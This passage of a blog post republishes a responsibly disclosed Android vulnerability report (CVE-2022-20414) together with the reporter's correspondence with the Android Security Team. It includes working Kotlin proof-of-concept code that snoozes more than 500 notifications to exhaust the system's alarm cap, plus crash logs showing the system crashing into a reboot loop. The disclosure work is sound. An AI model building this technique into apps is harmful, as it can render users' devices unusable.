follows:</p>\n<ol>\n<li>Initial severity rating assessment (subject to change after review by component owners) (3)</li>\n<li>Development of an update</li>\n<li>Assignment of CVE</li>\n<li>Shared under NDA, as part of coordinated disclosure, to Android partners for remediation</li>\n<li>Release in a public Android security bulletin</li>\n<li>Android Security Rewards payment (if applicable)</li>\n</ol>\n<p>Most of these steps will typically be communicated in the sidebar. Please note that we may not reply to requests for status updates or information, however we will continue our typical assessment and remediation efforts. This issue will be updated with information once the reported issue is publicly fixed, if not prior.</p>\n<p>Thank you,<br>Android Security Team</p>\n<p>(1) Contributor license agreement: <a href=\"https://cla.developers.google.com/clas\">https://cla.developers.google.com/clas</a><br>(2) Android Security Acknowledgements: <a href=\"https://source.android.com/security/overview/acknowledgements\">https://source.android.com/security/overview/acknowledgements</a><br>(3) Android severity guidelines: <a href=\"https://source.android.com/security/overview/updates-resources.html\">https://source.android.com/security/overview/updates-resources.html</a></p>\n<blockquote>\n<p><a href=\"mailto:&#121;&#x73;&#x79;&#57;&#53;&#x30;&#x38;&#48;&#51;&#x40;&#103;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#99;&#111;&#x6d;\">&#121;&#x73;&#x79;&#57;&#53;&#x30;&#x38;&#48;&#51;&#x40;&#103;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#99;&#111;&#x6d;</a></p>\n</blockquote>\n<p>Thank you for your reply. ACTIONS DONE:</p>\n<ol>\n<li>I have signed the CLA for only myself.</li>\n<li>If my work can help improve AOSP, it’s an honor for me to be acknowledged. I want my information to be displayed like this: Sylvester Yao (姚圣禹, <a href=\"https://blog.ysy950803.top/\">blog.ysy950803.top</a>)</li>\n<li>The PoC is an Android Studio Project including source code and APK. Please download the attachment.</li>\n</ol>\n<blockquote>\n<p><a href=\"mailto:&#106;&#97;&#46;&#x2e;&#46;&#x40;&#103;&#111;&#111;&#103;&#x6c;&#101;&#x2e;&#99;&#111;&#x6d;\">&#106;&#97;&#46;&#x2e;&#46;&#x40;&#103;&#111;&#111;&#103;&#x6c;&#101;&#x2e;&#99;&#111;&#x6d;</a></p>\n</blockquote>\n<p>Hello,</p>\n<p>Thank you for the additional information as well as your acknowledgement. We will be following our standard investigation and remediation process with this report and ask for your continued confidentiality while we work on this issue.</p>\n<p>Thank you,<br>Android Security Team</p>\n<blockquote>\n<p><a href=\"mailto:&#101;&#106;&#46;&#46;&#x2e;&#x40;&#103;&#111;&#111;&#103;&#108;&#101;&#x2e;&#99;&#x6f;&#x6d;\">&#101;&#106;&#46;&#46;&#x2e;&#x40;&#103;&#111;&#111;&#103;&#108;&#101;&#x2e;&#99;&#x6f;&#x6d;</a></p>\n</blockquote>\n<p>Hello,</p>\n<p>The Android security team has conducted an initial severity assessment on this report. Based on our published severity assessment matrix (1) it was rated as High severity. This issue has been assigned to the appropriate team for remediation, and we’re targeting a fix for release in an upcoming Android Security Bulletin. We will provide an update on remediation status as it becomes available. We ask for your continued confidentiality as we proceed with our standard investigation and remediation process.</p>\n<p>Thank you,<br>Android Security Team<br>(1) Severity Matrix: <a href=\"https://source.android.com/security/overview/updates-resources#severity\">https://source.android.com/security/overview/updates-resources#severity</a></p>\n<blockquote>\n<p><a href=\"mailto:&#121;&#x73;&#x79;&#x39;&#x35;&#48;&#x38;&#x30;&#51;&#x40;&#103;&#x6d;&#97;&#x69;&#x6c;&#46;&#x63;&#111;&#x6d;\">&#121;&#x73;&#x79;&#x39;&#x35;&#48;&#x38;&#x30;&#51;&#x40;&#103;&#x6d;&#97;&#x69;&#x6c;&#46;&#x63;&#111;&#x6d;</a></p>\n</blockquote>\n<p>Thanks for your efforts!</p>\n<p>I will continue to follow this issue and support you in any way I can.</p>\n<blockquote>\n<p><a href=\"mailto:&#x79;&#115;&#x79;&#57;&#x35;&#48;&#x38;&#48;&#x33;&#64;&#x67;&#x6d;&#97;&#x69;&#108;&#x2e;&#99;&#111;&#109;\">&#x79;&#115;&#x79;&#57;&#x35;&#48;&#x38;&#48;&#x33;&#64;&#x67;&#x6d;&#97;&#x69;&#108;&#x2e;&#99;&#111;&#109;</a></p>\n</blockquote>\n<p>Hello! How is the progress?</p>\n<blockquote>\n<p><a href=\"mailto:&#106;&#97;&#x2e;&#x2e;&#46;&#64;&#103;&#x6f;&#x6f;&#x67;&#x6c;&#101;&#46;&#x63;&#111;&#x6d;\">&#106;&#97;&#x2e;&#x2e;&#46;&#64;&#103;&#x6f;&#x6f;&#x67;&#x6c;&#101;&#46;&#x63;&#111;&#x6d;</a></p>\n</blockquote>\n<p>Hello,</p>\n<p>Thank you for following up! This issue has been fixed and is targeted for release in an upcoming Android Security Bulletin. It will be reviewed for both a CVE and reward eligibility under Android Security Rewards Program rules closer to that time (1). Further details will be provided here when available.</p>\n<p>Thank you,<br>Android Security Team</p>\n<p>(1) <a href=\"https://www.google.com/about/appsecurity/android-rewards/\">https://www.google.com/about/appsecurity/android-rewards/</a></p>\n<blockquote>\n<p><a href=\"mailto:&#x61;&#x6e;&#46;&#x2e;&#x2e;&#64;&#103;&#111;&#x6f;&#x67;&#x6c;&#x65;&#x2e;&#99;&#x6f;&#109;\">&#x61;&#x6e;&#46;&#x2e;&#x2e;&#64;&#103;&#111;&#x6f;&#x67;&#x6c;&#x65;&#x2e;&#99;&#x6f;&#109;</a></p>\n</blockquote>\n<p>Congratulations! The rewards committee decided to reward you USD $5,000 for reporting this High severity vulnerability. We are paying for the bug report and proof of concept.</p>\n<p>To collect the reward, if you haven’t already, please complete the Android Contributor License Agreement for Individuals, so we can use your test code:<br><a href=\"https://cla.developers.google.com/clas\">https://cla.developers.google.com/clas</a></p>\n<p>You will receive an email with details on the next steps to collect the reward.</p>\n<p>Thank you for your contributions to the safety and security of the Android ecosystem.</p>\n<p>Best Regards,<br>Android Security Team</p>\n<blockquote>\n<p><a href=\"mailto:&#121;&#115;&#x79;&#x39;&#53;&#48;&#x38;&#x30;&#51;&#64;&#x67;&#109;&#97;&#105;&#108;&#x2e;&#99;&#111;&#x6d;\">&#121;&#115;&#x79;&#x39;&#53;&#48;&#x38;&#x30;&#51;&#64;&#x67;&#109;&#97;&#105;&#108;&#x2e;&#99;&#111;&#x6d;</a></p>\n</blockquote>\n<p>Thank you for your hard work, I am honored to contribute to the Google ecosystem.</p>\n<blockquote>\n<p><a href=\"mailto:&#x6a;&#x61;&#x2e;&#x2e;&#x2e;&#64;&#x67;&#111;&#111;&#x67;&#x6c;&#x65;&#x2e;&#99;&#x6f;&#x6d;\">&#x6a;&#x61;&#x2e;&#x2e;&#x2e;&#64;&#x67;&#111;&#111;&#x67;&#x6c;&#x65;&#x2e;&#99;&#x6f;&#x6d;</a></p>\n</blockquote>\n<p>Hello,</p>\n<p>We will be releasing a patch for this issue in an upcoming bulletin. It will first be released to partners, then to the public the following month.</p>\n<p>If you haven’t already, please complete the Google Contributor License Agreement for Individuals, so we can use your patch and test code (1).</p>\n<p>We’d also like to recognize your contribution on our acknowledgements page (2). The acknowledgement information we have on record is “Sylvester Yao (姚圣禹, blog.ysy950803.top)”. Please let us know if it has changed.</p>\n<p>We may also make this bug publicly accessible when the fix is submitted to AOSP. Please let us know if you would like to keep the bug private instead.</p>\n<p>Your CVE ID is CVE-2022-20414.</p>\n<p>Thanks,<br>Android Security Team</p>\n<p>(1) <a href=\"https://cla.developers.google.com/clas\">https://cla.developers.google.com/clas</a><br>(2) <a href=\"https://source.android.com/security/overview/acknowledgements\">https://source.android.com/security/overview/acknowledgements</a></p>\n<blockquote>\n<p><a href=\"mailto:&#x79;&#115;&#x79;&#x39;&#x35;&#48;&#56;&#x30;&#51;&#x40;&#103;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#x6d;\">&#x79;&#115;&#x79;&#x39;&#x35;&#48;&#56;&#x30;&#51;&#x40;&#103;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#x6d;</a></p>\n</blockquote>\n<p>Thanks for your work. Where can I see the fix code?</p>\n<blockquote>\n<p><a href=\"mailto:&#106;&#x61;&#46;&#x2e;&#46;&#x40;&#103;&#x6f;&#111;&#x67;&#108;&#x65;&#x2e;&#x63;&#x6f;&#x6d;\">&#106;&#x61;&#46;&#x2e;&#46;&#x40;&#103;&#x6f;&#111;&#x67;&#108;&#x65;&#x2e;&#x63;&#x6f;&#x6d;</a></p>\n</blockquote>\n<p>Hello,</p>\n<p>This is targeted to be released in the November bulletin. Thank you for your continued engagement with the Android VRP!</p>\n<p>Best,<br>Android Security Team</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<blockquote>\n<p>2022年，一次偶然的机会，我发现了一个会导致Android系统无限重启致使设备完全不可用的高危漏洞，遂提交给了Google。当年11月的AOSP补丁对此进行了修复，本文是我提交漏洞报告的原文，现公开，待整理。具体可以在<a href=\"https://source.android.com/docs/security/bulletin/2022-11-01\">Android Security Bulletin—November 2022</a>中搜索CVE-2022-20414了解更多。</p>\n</blockquote>\n<h3 id=\"Report-description\"><a href=\"#Report-description\" class=\"headerlink\" title=\"Report description\"></a>Report description</h3><blockquote>\n<p>In a few words describe your bug. This will help you search for it later.</p>\n</blockquote>\n<p>The “snoozeNotification” method of NotificationListenerService causes Android system to crash and cyclic reboot.</p>\n<h3 id=\"Bug-location\"><a href=\"#Bug-location\" class=\"headerlink\" title=\"Bug location\"></a>Bug location</h3><h4 id=\"Which-product-or-website-have-you-found-a-vulnerability-in\"><a href=\"#Which-product-or-website-have-you-found-a-vulnerability-in\" class=\"headerlink\" title=\"Which product or website have you found a vulnerability in?\"></a>Which product or website have you found a vulnerability in?</h4><p>Android</p>\n<h3 id=\"The-problem\"><a href=\"#The-problem\" class=\"headerlink\" title=\"The problem\"></a>The problem</h3><h4 id=\"Please-describe-the-technical-details-of-the-vulnerability\"><a href=\"#Please-describe-the-technical-details-of-the-vulnerability\" class=\"headerlink\" title=\"Please describe the technical details of the vulnerability\"></a>Please describe the technical details of the vulnerability</h4><p>Starting from Android 10, there is a change about <code>AlarmManagerService</code> and we can check the commit in AOSP: <a href=\"https://cs.android.com/android/_/android/platform/frameworks/base/+/0e49b64f40779d6702d10078958031fa540b6138\">Adding a per-uid cap on concurrent alarms</a>. A Google engineer added a piece of code to <code>AlarmManagerService</code>:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"title function_\">setImpl</span><span class=\"params\">(...)</span> &#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (mLock) &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (mAlarmsPerUid.get(callingUid, <span class=\"number\">0</span>) &gt;= mConstants.MAX_ALARMS_PER_UID) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">errorMsg</span> <span class=\"operator\">=</span></span><br><span class=\"line\">                <span class=\"string\">&quot;Maximum limit of concurrent alarms &quot;</span> + mConstants.MAX_ALARMS_PER_UID</span><br><span class=\"line\">                + <span class=\"string\">&quot; reached for uid: &quot;</span> + UserHandle.formatUid(callingUid)</span><br><span class=\"line\">                + <span class=\"string\">&quot;, callingPackage: &quot;</span> + callingPackage;</span><br><span class=\"line\">            <span class=\"comment\">// STOPSHIP (b/128866264): Just to catch breakages. Remove before final release.</span></span><br><span class=\"line\">            Slog.wtf(TAG, errorMsg);</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">UnsupportedOperationException</span>(errorMsg);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>For any package, if the current number of alarms exceeds 500, an <code>UnsupportedOperationException</code> will be thrown and cause the process to crash, <strong>even if it is a system process.</strong></p>\n<p>In general, we do not have permission to set alarm for Android system processes. But let’s take a look at another piece of code that can be implemented by any third-party application:</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TestCrashService</span> : <span class=\"type\">NotificationListenerService</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">val</span> random = Random(System.currentTimeMillis())</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">override</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">onNotificationPosted</span><span class=\"params\">(sbn: <span class=\"type\">StatusBarNotification</span>?)</span></span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">         * Snooze any notification here with a random duration (fixed duration also works).</span></span><br><span class=\"line\"><span class=\"comment\">         * The duration better be longer so snoozing can be maintained.</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        sbn?.let &#123;</span><br><span class=\"line\">            <span class=\"keyword\">val</span> duration = TimeUnit.DAYS.toMillis(random.nextLong(<span class=\"number\">30</span>, <span class=\"number\">365</span>))</span><br><span class=\"line\">            snoozeNotification(it.key, duration)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>We can import <code>android.service.notification.NotificationListenerService</code> and implement a subclass. <strong>A pending alarm is set by <code>AlarmManager</code> when <code>snoozeNotification</code> method is called.</strong></p>\n<p>You can run <code>adb shell dumpsys alarm</code> to find the alarm like this:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RTC_WAKEUP #164: Alarm&#123;6975754 type 0 origWhen 1684207980006 whenElapsed 30672085209 android&#125;</span><br><span class=\"line\">tag=*walarm*:SnoozeHelper.EVALUATE</span><br><span class=\"line\">type=RTC_WAKEUP origWhen=2023-05-16 11:33:00.006 window=0 exactAllowReason=allow-listed repeatInterval=0 count=0 flags=0x9</span><br><span class=\"line\">policyWhenElapsed: requester=+354d23h27m52s23ms app_standby=-8m44s929ms device_idle=-- battery_saver=-- power_pending=--</span><br><span class=\"line\">whenElapsed=+354d23h27m52s23ms maxWhenElapsed=+354d23h27m52s23ms</span><br><span class=\"line\">operation=PendingIntent&#123;a03f6fd: PendingIntentRecord&#123;d9f6ff2 android broadcastIntent&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>If there are so many notifications being snoozing, an equivalent amount of pending alarms will be attached to the <strong>system process</strong> <code>android</code>. It’s very dangerous because an exception is waiting for you before reaching the maximum limit.</p>\n<p><strong>Finally, the system crashes and is likely to fall into a loop of reboots. That’s where the vulnerability lies.</strong></p>\n<h4 id=\"Please-briefly-explain-who-can-exploit-the-vulnerability-and-what-they-gain-when-doing-so\"><a href=\"#Please-briefly-explain-who-can-exploit-the-vulnerability-and-what-they-gain-when-doing-so\" class=\"headerlink\" title=\"Please briefly explain who can exploit the vulnerability, and what they gain when doing so\"></a>Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4><p>I have to say that this is a very serious system vulnerability. For any application that implements <code>NotificationListenerService</code>, as long as users <strong>allow notification access</strong>, it may cause Android system processes to crash, further causing the device to get stuck in a reboot loop and become unavailable.</p>\n<p>We can find many apps designed to manage notifications on Play Store. They may use <code>snoozeNotification</code> method to delay or eliminate notifications. If notifications are so many and snoozing duration is not short, there will be a risk of causing Android system to crash once the number of pending alarms reaches the limit.</p>\n<p><strong>In other words, someone with bad intentions has way to use this vulnerability to develop malicious applications that can blackmail others.</strong> For the average user, it is difficult to recover from this reboot loop.</p>\n<h4 id=\"Upload-file\"><a href=\"#Upload-file\" class=\"headerlink\" title=\"Upload file\"></a>Upload file</h4><blockquote>\n<p>You can add a file to your report to provide additional information on the vulnerability. Max file size is 50MB.</p>\n</blockquote>\n<p>……</p>\n<h3 id=\"The-cause\"><a href=\"#The-cause\" class=\"headerlink\" title=\"The cause\"></a>The cause</h3><h4 id=\"Please-specify-the-steps-to-reproduce-the-issue-including-sample-code-where-appropriate-Please-be-as-detailed-as-possible\"><a href=\"#Please-specify-the-steps-to-reproduce-the-issue-including-sample-code-where-appropriate-Please-be-as-detailed-as-possible\" class=\"headerlink\" title=\"Please specify the steps to reproduce the issue, including sample code where appropriate. Please be as detailed as possible.\"></a>Please specify the steps to reproduce the issue, including sample code where appropriate. Please be as detailed as possible.</h4><p>Any application can cause a system crash in just two steps. The sample code has been included in a complete Android Studio project attatched below.</p>\n<p>Step 1: Please allow notification access for the app. Then the implementation of <code>NotificationListenerService</code> can be running.</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">startNotificationAccessSetting</span><span class=\"params\">(context: <span class=\"type\">Context</span>)</span></span> = <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).apply &#123;</span><br><span class=\"line\">        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    <span class=\"literal\">true</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (e: ActivityNotFoundException) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        context.startActivity(Intent().apply &#123;</span><br><span class=\"line\">            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)</span><br><span class=\"line\">            component = ComponentName(</span><br><span class=\"line\">                <span class=\"string\">&quot;com.android.settings&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;com.android.settings.Settings\\$NotificationAccessSettingsActivity&quot;</span></span><br><span class=\"line\">            )</span><br><span class=\"line\">            putExtra(<span class=\"string\">&quot;:settings:show_fragment&quot;</span>, <span class=\"string\">&quot;NotificationAccessSettings&quot;</span>)</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">        <span class=\"literal\">true</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (e1: Exception) &#123;</span><br><span class=\"line\">        <span class=\"literal\">false</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>And the subclass is simple like this:</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TestCrashService</span> : <span class=\"type\">NotificationListenerService</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">val</span> random = Random(System.currentTimeMillis())</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">override</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">onNotificationPosted</span><span class=\"params\">(sbn: <span class=\"type\">StatusBarNotification</span>?)</span></span> &#123;</span><br><span class=\"line\">        sbn?.let &#123;</span><br><span class=\"line\">            <span class=\"keyword\">val</span> duration = TimeUnit.DAYS.toMillis(random.nextLong(<span class=\"number\">30</span>, <span class=\"number\">365</span>))</span><br><span class=\"line\">            snoozeNotification(it.key, duration)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Step 2: Post a large number of notifications over 500 (<code>MAX_ALARMS_PER_UID</code>).</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">step2</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">val</span> name = <span class=\"string\">&quot;CrashBySnooze&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">val</span> descriptionText = <span class=\"string\">&quot;For test crash.&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">val</span> importance = NotificationManager.IMPORTANCE_LOW</span><br><span class=\"line\">    <span class=\"keyword\">val</span> channel = NotificationChannel(<span class=\"string\">&quot;crash_by_snooze&quot;</span>, name, importance).apply &#123;</span><br><span class=\"line\">        description = descriptionText</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">val</span> ntfMgr = getSystemService(Context.NOTIFICATION_SERVICE) <span class=\"keyword\">as</span> NotificationManager</span><br><span class=\"line\">    ntfMgr.createNotificationChannel(channel)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">val</span> ntfBuilder = NotificationCompat.Builder(applicationContext, <span class=\"string\">&quot;crash_by_snooze&quot;</span>)</span><br><span class=\"line\">        .setContentTitle(<span class=\"string\">&quot;CrashBySnooze&quot;</span>)</span><br><span class=\"line\">        .setContentText(<span class=\"string\">&quot;For test crash.&quot;</span>)</span><br><span class=\"line\">        .setSmallIcon(R.mipmap.ic_launcher)</span><br><span class=\"line\">        .setPriority(NotificationCompat.PRIORITY_LOW)</span><br><span class=\"line\">    mainScope.launch(Dispatchers.IO) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">val</span> ntfBaseId = Random(System.currentTimeMillis()).nextInt(<span class=\"number\">123456</span>, <span class=\"number\">654321</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (i <span class=\"keyword\">in</span> <span class=\"number\">0.</span><span class=\"number\">.555</span>) &#123;</span><br><span class=\"line\">            ntfMgr.notify(ntfBaseId + i, ntfBuilder.build())</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Daily use will not have so many notifications appear at once, but day by day, this is chronic death for your Android device.</p>\n<h4 id=\"Specify-the-build-fingerprint-from-the-device-used-to-reproduce-the-issue-The-issue-should-reproduce-on-a-recent-build-within-the-last-30-days\"><a href=\"#Specify-the-build-fingerprint-from-the-device-used-to-reproduce-the-issue-The-issue-should-reproduce-on-a-recent-build-within-the-last-30-days\" class=\"headerlink\" title=\"Specify the build fingerprint from the device used to reproduce the issue. The issue should reproduce on a recent build (within the last 30 days).\"></a>Specify the build fingerprint from the device used to reproduce the issue. The issue should reproduce on a recent build (within the last 30 days).</h4><blockquote>\n<p>run adb shell getprop ro.build.fingerprint and adb shell cat &#x2F;proc&#x2F;version for kernel vulnerabilities</p>\n</blockquote>\n<p>All devices based on Android 10+ (i.e. 10~13) have this vulnerability.</p>\n<h4 id=\"Provide-a-Proof-of-Concept-complete-Android-Studio-project-source-code-including-an-Android-bp-file-or-similar-artifacts\"><a href=\"#Provide-a-Proof-of-Concept-complete-Android-Studio-project-source-code-including-an-Android-bp-file-or-similar-artifacts\" class=\"headerlink\" title=\"Provide a Proof of Concept, complete Android Studio project, source code including an Android.bp file, or similar artifacts.\"></a>Provide a Proof of Concept, complete Android Studio project, source code including an Android.bp file, or similar artifacts.</h4><blockquote>\n<p>You can also include a malformed media file, or a video walkthrough for UX issues.</p>\n</blockquote>\n<p>……</p>\n<h4 id=\"Provide-crash-artifacts-including-stack-trace-if-available\"><a href=\"#Provide-crash-artifacts-including-stack-trace-if-available\" class=\"headerlink\" title=\"Provide crash artifacts including stack trace (if available).\"></a>Provide crash artifacts including stack trace (if available).</h4><p>The crash can cause system zyote to die:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2022-05-27 16:35:11.453 1451-1451/system_process W/AlarmManager: Maximum limit of concurrent alarms 500 reached for uid: 1000, callingPackage: android</span><br><span class=\"line\">2022-05-27 16:35:11.453 1451-1451/system_process E/Zygote: System zygote died with fatal exception</span><br><span class=\"line\">    java.lang.IllegalStateException: Maximum limit of concurrent alarms 500 reached for uid: 1000, callingPackage: android</span><br><span class=\"line\">        at com.android.server.alarm.AlarmManagerService.setImpl(AlarmManagerService.java:2087)</span><br><span class=\"line\">        at com.android.server.alarm.AlarmManagerService$5.set(AlarmManagerService.java:2630)</span><br><span class=\"line\">        at android.app.AlarmManager.setImpl(AlarmManager.java:957)</span><br><span class=\"line\">        at android.app.AlarmManager.setImpl(AlarmManager.java:917)</span><br><span class=\"line\">        at android.app.AlarmManager.setExactAndAllowWhileIdle(AlarmManager.java:1185)</span><br><span class=\"line\">        at com.android.server.notification.SnoozeHelper.lambda$scheduleRepostAtTime$2$SnoozeHelper(SnoozeHelper.java:508)</span><br><span class=\"line\">        at com.android.server.notification.SnoozeHelper$$ExternalSyntheticLambda4.run(Unknown Source:10)</span><br><span class=\"line\">        at com.android.server.notification.SnoozeHelper.scheduleRepostAtTime(SnoozeHelper.java:513)</span><br><span class=\"line\">        at com.android.server.notification.SnoozeHelper.scheduleRepost(SnoozeHelper.java:498)</span><br><span class=\"line\">        at com.android.server.notification.SnoozeHelper.snooze(SnoozeHelper.java:240)</span><br><span class=\"line\">        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.snoozeNotificationLocked(NotificationManagerService.java:6978)</span><br><span class=\"line\">        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.snoozeLocked(NotificationManagerService.java:6955)</span><br><span 